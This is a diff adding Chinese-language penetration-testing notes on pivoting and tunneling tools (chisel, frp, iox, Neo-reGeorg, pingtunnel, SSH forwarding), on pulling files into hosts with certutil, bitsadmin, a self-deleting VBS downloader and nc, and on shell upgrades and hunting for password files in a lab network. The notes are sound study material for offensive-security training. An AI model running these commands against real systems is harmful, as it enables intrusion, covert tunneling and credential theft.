@@ -754,3 +754,645 @@ krbrelay.exe -ntlm -session 1 -clsid "354ff91b-5e49-4bdc-a8e6-1cb6c6877182"
 
 其中session 通过powershell qwinsta获得
 ```
+
+
+
+
+
+
+
+# 内网隧道技术(portfwd,autoroute,chisel,earthworm,iox,frp,ssh,neo-regeorg,pingtunnel,6tunnel)
+
+
+
+## 强制代理工具
+
+proxifier
+
+proxychains
+
+------
+
+## portfwd
+
+```
+portfwd add -L 192.168.163.131 -l 9090 -r 192.168.163.1 -p 80 
+
+\#正向端口转发 将192.168.163.1:80映射到 192.168.163.131:9090上 -L 默认0.0.0.0
+
+\#可能会导致线路卡住（实验性使用）
+
+portfwd add -R -L 192.168.49.129 -l 1000 -p 111 
+
+\#反向端口转发 中转机器监听自身，自身端口111收到消息，传递到 192.168.49.129:1000
+
+portfwd add -R -L 192.168.11.130 -l 22 -p 111
+
+ssh centos7-2@192.168.49.131 -p 111 
+
+\#中转机监听自身，自身端口111收到消息，传递到192.168.11.130:22端口
+
+这里的-L 可以是kali外网的主机，也可以是中转机内网的主机
+```
+
+------
+
+## autoroute
+
+```
+run autoroute -s /[mask]  mask default 255.255.255.255.0
+
+run autoroute -p 查看面板
+
+run autoroute -d -s  删除目标proxy
+
+example:
+
+run autoroute -s 192.168.11.1/24
+
+auxiliary/server/socks_proxy
+
+\#将msfconsole的 proxy 实现到本地
+
+proxychains <...>
+```
+
+------
+
+## chisel[http]
+
+```
+正向端口转发
+
+centos7-1 : ./chisel server -p 12345
+
+kali : chisel.exe client cen_ip:12345 0.0.0.0:11111:127.0.0.1:22222
+
+1 . centos7-1 自身127.0.0.1:22222 开放一个服务只能本地自己访问
+
+2 . centos7-1 架设chisel server 开放端口 12345
+
+3 . kali 架设chisel chilent 连接 cen_ip:12345 将centos7-1 的127.0.0.1:22222 映射到kali的11111端口 
+
+4 . 这里的127.0.0.1:22222 可以替换为centos7-1内网centos7-2 的ip：端口
+
+反向端口转发
+
+kali : ./chisel server -p 12345 --reverse
+
+centos7-1 : ./chisel client kali_ip:12345 R:11111:127.0.0.1:22222
+
+1 . centos7-1 自身127.0.0.1:22222 开放一个服务只能本地自己访问
+
+2 . kali 架设chisel server 开放端口 12345 启用反向连接
+
+3. centos7-1 架设chilent 连接 kali_ip:12345 将centos7-1自身的127.0.0.1:22222 反向映射到kali的11111端口
+
+4 . 这里的127.0.0.1:22222 可以替换为centos7-1内网centos7-2 的ip：端口
+
+socks5正向代理
+
+centos7-1 : ./chisel server -p 12345 --socks5
+
+kali : ./chisel client cen_ip:12345 socks
+
+1 . 通过centos7-1作为跳板机
+
+2 . centos7-1 运行 chisel server 开放端口12345 使用socks5
+
+3 . kali 运行 chisel client client 连接 cen_ip:13245 使用socks启用socks5代理
+
+socks5反向代理
+
+kali : ./chisel server -p 12345 --reverse --socks5
+
+centos7-1 : ./chisel client kali_ip:12345 R:socks
+
+1 . 通过centos7-1作为跳板机
+
+2 . kali 运行 chisel server 开放端口12345 启用反向连接，启用socks5
+
+3 . centos7-1 运行 chisel client 连接 kali_ip:12345 使用socks启用socks5代理
+```
+
+------
+
+## earthworm(socks5隧道)
+
+```
+ssocksd… >--o -l 正向sock
+
+rssocks… <--o -d -e 反向sock
+
+lcx_listen/rcsocks… >-< -l -e
+
+lcx_slave… <-> -d -e -f -g
+
+proxychains… -->
+```
+
+------
+
+## ssh
+
+```
+kali: 192.168.10.132
+
+centos7: 192.168.10.147 192.168.11.174
+
+centos7-2: 192.168.11.173
+
+ssh sock代理
+
+ssh -D 8800 centos7@192.168.10.147
+
+\#在kali上通过centos7建立本地8800对centos7的sock代理，流量通过kali本地8800流经centos7前往内网
+
+ssh端口转发
+
+(正向)(kali上执行命令)
+
+kali: ssh -L 12345:127.0.0.1:22 centos7@192.168.10.147
+
+\#通过centos7连接到centos7本地，并将centos7的22端口映射为kali本地端口12345
+
+kali: ssh -L 1234:192.168.11.173:22 centos7@192.168.10.147
+
+\#通过centos7连接到centos7-2，并将centos7-2的22端口映射为kali本地端口1234
+
+(反向)(中转机centos7上执行命令)
+
+centos7: ssh -R 4321:127.0.0.1:22 kali@192.168.10.132
+
+\#在中转机centos7上执行命令将kali的4321端口映射为centos7本地的22端口
+
+centos7: ssh -R 54321:192.168.11.173:22 kali@192.168.10.132
+
+\#在中转机centos7上执行命令将kali的54321端口映射为centos7-2的22端口
+
+ssh跳板连接
+
+ssh -J centos7@192.168.10.147 centos7-2@192.168.11.173 
+
+\#通过centos7的ssh连接到centos7-2的ssh
+```
+
+------
+
+## iox
+
+```
+优点 多级转发方便 可加密
+
+端口转发
+
+\#监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发
+
+./iox fwd -l 8888 -l 9999 相当于 ew -s lcx_listen
+
+\#监听0.0.0.0:8888，把流量转发到1.1.1.1:9999
+
+./iox fwd -l 8888 -r 1.1.1.1:9999 相当于ew -s lcx_tran
+
+\#连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发
+
+./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999 相当于ew -s lcx_slave
+
+正向socks5代理
+
+centos7-1 : ./iox proxy -l 12345
+
+\#本地开启socks5代理 开放端口 12345
+
+反向socks5代理
+
+kali : ./iox proxy -l 2345 -l 2346 #此处2345是远程回连端 2346是本地入口
+
+centos7-1 : ./iox proxy -r kali_ip:2345
+
+加密 : kali 仅开始输出端不能加密，输入端可加密
+
+二层正向socks5代理
+
+kali : ./iox fwd -l 2345 -l *2346 -k 123456
+
+centos7-1 : ./iox fwd -r *kali_ip:2346 -r *centos7-2_ip:12345 -k 123456 
+
+centos7-2 : ./iox proxy -l *12345 123456
+
+\#kali 开启 本地端口转发 将 2345 监听到的信息转发到 2346
+
+\#centos7-1 开启端口转发 连接 kali_ip:2346 和 centos7-2_ip:12345
+
+\#centos7-2 开启本地socks5 代理 监听本地端口 12345
+
+二层反向socks5代理
+
+kali : ./iox proxy -l *2346 -l 2345 -k 123456
+
+centos7-1 : ./iox fwd -l *5678 -r *kali_ip:2346 -k 123456
+
+centos7-2 : ./iox proxy -r *centos7-1_ip:5678 123456
+
+kali 开启本地socks5转发
+
+centos 7-1 开启端口转发 监听 5678 转发到 kali_ip:2346
+
+centos 7-2 开启反向socks5 连接centos7-1的 5678端口
+```
+
+------
+
+## frp
+
+```
+弊端：增加了一个文件 frpc.toml 
+
+socks5代理
+
+kali : ./frps -p 8888
+
+centos7-1 : frpc -c frpc.toml
+
+frpc.toml
+
+""""""""""""""""""""
+
+serverAddr = "192.168.12.130"
+
+serverPort = 8888
+
+[[proxies]]
+
+name = "test1"
+
+type = "tcp"
+
+remotePort = 6000
+
+[proxies.plugin]
+
+type = "socks5"
+
+""""""""""""""""""""
+
+kali 本地建立frps 服务器，监听本地端口8888
+
+centos7-1 连接kali_ip kali_port 开启socks5 并映射使用kali本地6000通信
+```
+
+------
+
+## neo-regeorg(http隧道)
+
+```
+python neoreg.py generate -k passwd 生成带密码的一系列tunnel文件
+
+将文件上传至靶机网站目录
+
+python neoreg.py -u http://..../tunnel.php -p 9999 -k passwd #开启socks5服务开放本地端口9999连接远程web服务器
+
+将本地proxychains文件修改为127.0.0.1 9999
+```
+
+------
+
+## pingtunnel(icmp隧道)  #需要root权限
+
+```
+pingtunnel(仅仅linux可以使用,且为root权限,windows测试使用失败)
+
+socks5代理
+
+centos7: ./pingtunnel -type server -noprint 1 -nolog 1
+
+kali: ./pingtunnel -type client -l 0.0.0.0:1080 -s 192.168.10.147 -sock5 1 -noprint 1
+
+端口转发
+
+centos7-1 : ./pingtunnel -type server -noprint 1 -nolog 1
+
+kali : ./pingtunnel -type client -l 0.0.0.0:1234 -s 192.168.12.131 -t 192.168.11.133:8000 -tcp 1 -noprint 1 -nolog 1  #端口转发 
+```
+
+------
+
+## 6tunnel
+
+```
+6tunnel -4 7777 fe80::5b33:115b:ce91:1d37%eth0 22
+
+\#建立端口转发,将fe80::5b33:115b:ce91:1d37的22端口映射到kali本地7777端口，使用ipv6通信
+```
+
+
+
+------
+
+idoine dns隧道
+
+
+
+
+
+
+
+
+
+
+
+# 上传下载,服务建立,压缩解压缩,提升交互性,查找(文件,内容)
+
+certutil,bitsadmin,vbs,wget,curl,nc,scp,msfconsole,invoke-webrequest
+
+http,smb,tcp,ftp
+
+------
+
+certutil
+
+certutil.exe -urlcache -split -f http://192.168.1.192/file.txt file.txt 
+
+bitsadmin
+
+bitsadmin /rawreturn /transfer down "https://www.baidu.com/robots.txt" c:\robots.txt #c:\robots.txt 必须是绝对路径
+
+vbs
+
+++++++++++++++++++++++++++++++
+
+Set Post = CreateObject("Msxml2.XMLHTTP") 
+
+Set Shell = CreateObject("Wscript.Shell")
+
+Post.Open "GET","http://192.168.11.131:8000/test.txt",0
+
+Post.Send()
+
+Set aGet = CreateObject("ADODB.Stream")
+
+aGet.Mode = 3
+
+aGet.Type = 1
+
+aGet.Open()
+
+aGet.Write(Post.responseBody)
+
+aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2
+
+++++++++++++++++++++++++++++++
+
+echo 'Set Post = CreateObject("Msxml2.XMLHTTP"):Set Shell = CreateObject("Wscript.Shell"):Post.Open "GET","http://192.168.11.131:8000/test.txt",0:Post.Send():Set aGet = CreateObject("ADODB.Stream"):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2' > download.vbs ; .\download.vbs ; sleep 1 ; del download.vbs
+
+wget(powershell)
+
+wget http://192.168.163.131/pass -o pass
+
+nc
+
+nc -lvnp 443 < pass
+
+.\nc.exe 192.168.163.131 443 > pass1
+
+scp
+
+scp kali@192.168.163.131:/home/kali/main_box/pass pass1
+
+scp pass1 kali@192.168.163.131:/home/kali/pass4
+
+\#和ssh登录一样
+
+-r 递归目录复制
+
+scp -r kali@192.168.163.131:/home/kali/main_box/1 3 #将目录1重命名为3
+
+curl
+
+curl http://xxxxx/xxx -o xxx
+
+msfconsole
+
+download xxx xxx
+
+upload xxx xxx
+
+powershell
+
+Invoke-WebRequest URL -o"本地保存路径"
+
+wget curl 别名
+
+------
+
+服务器建立
+
+http
+
+python -m http.server 8000
+
+python2 -m SimpleHTTPServer 8000
+
+php -S 0:8000 #如果从浏览器访问需要index.php
+
+ruby -run -e httpd . -p 8000
+
+jwebserver -b 0.0.0.0 -p 8000 #java
+
+miniserve -p 8000 . #rust
+
+npx http-server -p 8000 #nodejs
+
+smb
+
+impacket-smbserver guest . -smb2support
+
+impacket-smbserver guest . -username admin -password passwd -smb2support
+
+impacket-smbclient anonymous@192.168.12.130 -no-pass
+
+impacket-smbclient admin:passwd@192.168.12.130 -no-pass
+
+tcp
+
+nc -lvnp 443 < 123.txt
+
+nc xxx.xxx.xxx.xxx 443 > 321.txt
+
+ftp
+
+python -m pyftpdlib -p 21
+
+------
+
+压缩技术详解
+
+gz bz2 xz 不支持多文件
+
+zip rar 7z 支持单文件，多文件，目录结构
+
+tar 支持打包多文件，目录结构
+
+------
+
+gz
+
+gzip 1.txt          #不留存 -k留存
+
+-l 查看文件内容
+
+gzip -d 1.txt.gz     
+
+------
+
+bz2
+
+bzip2 1.txt
+
+-l 查看文件内容
+
+bzip2 -d 1.txt.bz2
+
+------
+
+xz
+
+xz 1.txt
+
+-l 查看文件内容
+
+xz -d 1.txt.xz
+
+------
+
+tar
+
+tar -czvf 1.tar.gz 1 
+
+-cjvf 1.tar.bz2 1
+
+-cJvf 1.tar.xz 1
+
+-xzvf 1.tar.gz
+
+-xjvf 1.tar.bz2
+
+-xJvf 1.tar.xz -C /path/                   -C 解压到对应目录
+
+-tf 查看文件内容
+
+tar -cvf archive.tar file1.txt file2.txt mu 打包多个文件 其中mu是目录
+
+------
+
+zip
+
+zip 1.zip 1
+
+zip -d 1.zip    #留存源文件  -m不留存
+
+unzip 1.zip      
+
+unzip -l 1.zip 查看1.zip 内容
+
+zip -r main.zip 1.txt 2.txt mu                     #其中mu是目录 -r 保留目录结构
+
+zip -r -s 10m main.zip *    -s 10m 分卷压缩 每一卷10mb          解压缩时用7z解压缩
+
+zip -e -P "123" 1.txt.zip 1.txt     -e 设置密码，-P 静默输入密码，但会留存记录
+
+------
+
+rar
+
+rar a 1.rar 1
+
+rar x 1.rar
+
+rar l 1.rar 查看1.rar的内容
+
+-m0最快压缩    -m5 最大压缩率
+
+-v20m 分卷压缩，每卷20m m=MB, k=KB, g=GB
+
+-p12345 密码 可用" "括起来,\"代表字符"
+
+rar a -p12345 -m0 -v20m 1.rar 1
+
+------
+
+7z
+
+7z -l 列出其中的内容
+
+7z a -p12345 1.7z 1
+
+7z x 1.7z
+
+-mx=0 -mx=5 -mx=9   0仅仅存储，5正常默认，9最大压缩
+
+-v100m   分卷压缩
+
+-pPassword  加密
+
+------
+
+.cab[单文件]
+
+makecab
+
+mackcab 1.txt 1.cab
+
+expand rar.cab rar.exe
+
+cabextract
+
+cabextract 1.cab / 7z x 1.cab
+
+------
+
+compress-archive 123.jpg 123.zip
+
+compress-archive 文件夹 文件夹.zip
+
+expand-archive 123.zip 123.jpg
+
+expand-archive 文件夹 文件夹.zip
+
+------
+
+提升交互性
+
+RunasCs.exe one one -l 8 "cmd /c whoami"
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+stty raw -echo
+
+export TERM=xterm-color
+
+rlwrap -cAr 
+
+------
+
+查找文件(文件,内容)
+
+windows
+
+(cmd)
+
+dir /s /i ".\*passw*" #查找带passw字样的 目录和文件名
+
+findstr /s /i /n /c:"passw" /c:"secu" c:\users\qwe2\desktop\*.txt c:\users\qwe2\desktop\*.docx #查找带passw/secu字样的文件内容的 行   /s 递归 /i 不区分大小写 /n 带行号 /r 正则匹配 /c 匹配词 *.* / *.txt
+
+(powershell)
+
+gci -Path . -Recurse -Force | ? { $_.Name -like "*passw*" } #查找带passw字样的 目录和文件名
+
+gci -Path . -recurse | ? {$_.name -like "*.txt" } | sls -Pattern "passw" #递归查找txt文件中包含passw字样的 行
+
+linux
+
+find /tmp/. -iname "*passw*" #查找带passw字样的 目录和文件名
+
+grep -ir "pass" . #查找带passw的文件内容的 行
